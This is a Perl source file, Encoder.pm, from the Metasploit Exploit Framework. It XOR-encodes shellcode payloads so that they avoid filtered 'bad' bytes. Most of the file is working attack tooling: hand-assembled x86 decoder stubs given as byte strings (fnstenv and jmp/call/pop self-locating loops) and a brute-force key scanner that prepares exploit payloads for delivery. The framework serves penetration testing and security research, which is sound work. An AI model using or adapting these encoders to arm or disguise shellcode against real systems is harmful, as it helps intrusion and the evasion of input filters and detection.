#!/usr/bin/perl
###############

##
#         Name: Encoder.pm
#       Author: H D Moore <hdm [at] metasploit.com>
#      Version: $Revision$
#      License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
##

package Pex::Encoder;
use strict;


#
# This routine is used by the Framework to automatically
# encode a given payload so that the specified "bad" bytes
# are not in the end result. Currently it just uses juliano's
# really sweet key scanner algorithm, in the future it will
# dynamically generate and encode the encoder as well :)
#

sub Encode 
{
    my ($rawshell, $xbadc) = @_;
        
    my $xorkey = XorKeyScanDword($rawshell, $xbadc);
    
    if (! $xorkey)
    {
        print "Could not locate valid xor key\n";
        return;   
    }
    
    my $xordat = XorDword($xorkey, $rawshell);
    my $encode = XorDecoderDword("x86", $xorkey, length($xordat), $xbadc);

    my $shellcode = $encode . $xordat;

    # If you are using this with msf, this check will happen again inside of
    # the framework, but the check remains for standalone pex usage
    # sanity checking, this should never happen
    foreach my $c (split(//, $xbadc))
    {
        if (index($xordat, $c) != -1)
        {
            print "Encoder failed: caught character " . sprintf("0x%.2x", ord($c));
            return;
        }
    }


    return($shellcode);
}


#
# These are the current x86 decoders, all of them are static
# at the moment, but tend to meet the needs of most exploits.
#

sub XorDecoderDword {
    my ($arch, $xor, $len, $xbadc) = @_;
    if(! $len) { $len = 0x200 }

    
    if (lc($arch) eq "x86")
    {
    
        # this xor decoder was written by spoonm[at]ghettohackers.net
	    my $smallVersion = 0;
        # Pad to a 4 byte boundary, the xor data should already be padded
        # but just incase.
        my $loopCounter = int(($len - 1) / 4) + 1;
        $loopCounter *= -1;

        my $xorlen = pack("L", $loopCounter);
        my $xorkey = pack("L", $xor);
        
        # this anti-0xff encoder written by hdm[at]metasploit.com
        if (index($xbadc, "\xff") != -1)
        {

            # try sub len, then add len
            my $loopmode = "sub";
            my $lenops = "\x66\x81\xe9";
            $xorlen = pack("S", $loopCounter);
            
            if ($xorlen =~ /\x00|\xff/)
            {
                $xorlen = pack("S", abs($loopCounter));
                $lenops = "\x66\x81\xc1";
                $loopmode = "add";
            }
            
            if ($xorlen =~ /\x00|\xff/ && $loopCounter < 128)
            {
                $xorlen = chr(abs($loopCounter)) . "\x59\x90\x90";
                $lenops = "\x6a";
                $loopmode = "push";
            }
            
            if ($xorlen !~ /\x00|\xff/)
            {
                my $decoder = 
                "\xd9\xe1".                 # fabs
                "\xd9\x34\x24".             # fnstenv (%esp,1)
                "\x5b".                     # pop    %ebx
                "\x5b".                     # pop    %ebx
                "\x5b".                     # pop    %ebx
                "\x5b".                     # pop    %ebx
                "\x80\xc3\x1f".             # add    $0x1f,%bl
                "\x31\xc9".                 # xor    %ecx,%ecx
                $lenops . $xorlen.          # stick loop cnt into ecx
                "\x81\x33" .$xorkey.        # xorl   $0x69696969,(%ebx)
                "\x43".                     # inc    %ebx
                "\x43".                     # inc    %ebx
                "\x43".                     # inc    %ebx
                "\x43".                     # inc    %ebx
                "\xe2\xf4";                 # loop   a0000013 <_start+0x13>
                return $decoder;
            }
            
            # Fuck!
        } 
    
    
    
        # this xor decoder was written by spoonm[at]ghettohackers.net
	    my $smallVersion = 0;
        # Pad to a 4 byte boundary, the xor data should already be padded
        # but just incase.
        my $loopCounter = int(($len - 1) / 4) + 1;
        $loopCounter *= -1;

        my $xorlen = pack("L", $loopCounter);
        my $xorkey = pack("L", $xor);

        # If encoded data is small enough, use the single byte sub version
        if($loopCounter >= -128) {
            $smallVersion = 1;
            $xorlen = substr($xorlen, 0, 1);
        }

# hdm's old encoder
#        my $decoder =
#            "\xeb\x19".                     # jmp 804809b <xor_end>
#            "\x5e".                         # pop %esi
#            "\x31\xc9".                     # xor %ecx,%ecx
#            "\x81\xe9". $xorlen .           # sub -xorlen,%ecx
#            "\x81\x36". $xorkey .           # xorl xorkey,(%esi)
#            "\x81\xee\xfc\xff\xff\xff".     # sub $0xfffffffc,%esi (add esi, 0x04)
#            "\xe2\xf2".                     # loop 804808b <xor_xor>
#            "\xeb\x05".                     # jmp 80480a0 <xor_don>
#            "\xe8\xe2\xff\xff\xff";         # call 8048082 <xor_beg>

# spoon's smaller variable-length encoder
        my $decoder;
        if($smallVersion) {
            # 26 bytes
            $decoder =
                "\xeb\x13".                   # jmp SHORT 0x15 (xor_end)
                "\x5e".                       # xor_begin: pop esi
                "\x31\xc9".                   # xor ecx,ecx
                "\x83\xe9". $xorlen .         # sub ecx, BYTE -xorlen
                "\x81\x36". $xorkey .         # xor_xor: xor DWORD [esi],xorkey
                "\x83\xee\xfc".               # sub $esi,-4
                "\xe2\xf5".                   # loop 0x8 (xor_xor)
                "\xeb\x05".                   # jmp SHORT 0x1a (xor_done)
                "\xe8\xe8\xff\xff\xff";       # xor_end: call 0x2 (xor_begin)
                                              # xor_done:
        }
        else {
            # 29 bytes
            $decoder =
                "\xeb\x16".                   # jmp SHORT 0x18 (xor_end)
                "\x5e".                       # xor_begin: pop esi
                "\x31\xc9".                   # xor ecx,ecx
                "\x81\xe9". $xorlen .         # sub ecx, -xorlen
                "\x81\x36". $xorkey .         # xor_xor: xor DWORD [esi],xorkey
                "\x83\xee\xfc".               # sub $esi,-4
                "\xe2\xf5".                   # loop 0xb (xor_xor)
                "\xeb\x05".                   # jmp SHORT 0x1d (xor_done)
                "\xe8\xe5\xff\xff\xff";       # xor_end: call 0x2 (xor_begin)
                                              # xor_done:
        }

        return $decoder;
    }

    return;
}

sub XorDecoderWord {
    my ($arch, $xor, $len) = @_;
    if(! $len) { $len = 0x200 }

    # this xor decoder was written by hdm[at]metasploit.com
    if (lc($arch) eq "x86")
    {
        my $div = $len / 2;
        if ($len - (int($div) * 2) > 0) { $div++ }

        my $xorlen = pack("S", (0xffff - $div));
        my $xorkey = pack("S", $xor);

        my $decoder =
            "\xeb\x13".                     # jmp 8048095 <short_xor_end>
            # short_xor_beg:
            "\x5e".                         # pop %esi
            "\x31\xc9".                     # xor %ecx,%ecx
            "\x66\x81\xe9". $xorlen .       # sub $0xfff4,%cx
            # short_xor_xor:
            "\x66\x81\x36". $xorkey .       # xorw $0x1234,(%esi)
            "\x46".                         # inc %esi
            "\x46".                         # inc %esi
            "\xe2\xf7".                     # loop 804808a <short_xor_xor>
            "\xeb\x05".                     # jmp 804809a <short_xor_don>
            # short_xor_end:
            "\xe8\xe8\xff\xff\xff";         # call 8048082 <short_xor_beg>
        return $decoder;
    }
    return;
}

sub XorDecoderByte {
    my ($arch, $xor, $len) = @_;
    if(! $len) { $len = 0x200 }

    # this xor decoder was written by hdm[at]metasploit.com
    if (lc($arch) eq "x86")
    {
        $len = pack("S", 0xffff - $len);

        return
        "\xd9\xe1".                     # fabs
        "\xd9\x34\x24".                 # fnstenv (%esp,1)
        "\x5b".                         # pop %ebx
        "\x5b".                         # pop %ebx
        "\x5b".                         # pop %ebx
        "\x5b".                         # pop %ebx
        "\x80\xeb\xe7".                 # sub $0xe7,%bl
        # short_xor_beg:
        "\x31\xc9".                     # xor %ecx,%ecx
        "\x66\x81\xe9$len".             # sub $len,%cx
        "\x80\x33". chr($xor).          # xorb $0x69,(%ebx)
        "\x43".                         # inc %ebx
        "\xe2\xfa";                     # loop 8048093 <short_xor_xor>
    }
    return;
}




#
# These routines take a buffer and xor encodes it with the given
# given key value. The data is aligned to keysize blocks
# and padded with xor'd null values (to prevent pad ^ key problems)
#

sub XorDword {
    my ($xor, $buffer) = @_;
    my $res;
    my $c;

    for ($c = 0; $c < length($buffer); $c += 4)
    {
	    my $chunk = substr($buffer, $c);
        $chunk .= ("\x00" x (4 - length($chunk)));
	    $chunk  = unpack("L", $chunk) ^ $xor;
	    $res   .= pack("L", $chunk);
	}
    return $res;
}

sub XorWord {
    my ($xor, $buffer) = @_;
    my $res;
    my $c;
    for ($c = 0; $c < length($buffer); $c += 2)
    {
	    my $chunk = substr($buffer, $c);
        $chunk .= ("\x00" x (2 - length($chunk)));
	    $chunk  = unpack("S", $chunk) ^ $xor;
	    $res   .= pack("S", $chunk);
	}
    return $res;
}

sub XorByte {
    my ($xor, $buffer) = @_;
    my $res;

    foreach my $char (split(//, $buffer))
    {
        $res .= chr(ord($char) ^ $xor);
    }
    return $res;
}






# <joke>
# THIS ALGORITHM IS PATEND-PENDING BY JULIANO[at]COREST.COM AND USED UNDER LICENSE
# ATTEMPTS TO REVERSE ENGINEER THIS CODE WILL BE PROSECUTED UNDER THE DMCA
# </joke>

sub XorKeyScanDword
{
    my ($dat, $bad) = @_;
    my (@dh, @lu, %avh);
    my $x = 0;

    while ($x < length($dat) && (my $p = substr($dat, $x, 4)))
    {
        my @c = unpack("C4", $p);
        foreach my $z (0 .. 3)
        {
            $dh[$z]->{$c[$z]}++ if defined($c[$z])
        }
        $x += 4;
    }

    foreach my $c (split(//, $bad))
    {
        $avh{ord($c)}++;
        foreach my $z (0 .. 3)
        {
            foreach my $x (keys(%{$dh[$z]}))
            {
                $lu[$z]->{ord($c) ^ $x}++;
            }
        }
    }

    for my $iA (1 .. 255)
    {
        next if (exists($lu[0]->{$iA}) || $avh{$iA});
        for my $iB (1 .. 255)
        {
            next if (exists($lu[1]->{$iB}) || $avh{$iB});
            for my $iC (1 .. 255)
            {
                next if (exists($lu[2]->{$iC}) || $avh{$iC});
                for my $iD (1 .. 255)
                {
                    next if (exists($lu[3]->{$iD}) || $avh{$iD});
                    return unpack("L", pack("CCCC", $iA, $iB, $iC, $iD));
                }
            }
        }
    }
    return undef;
}


1;
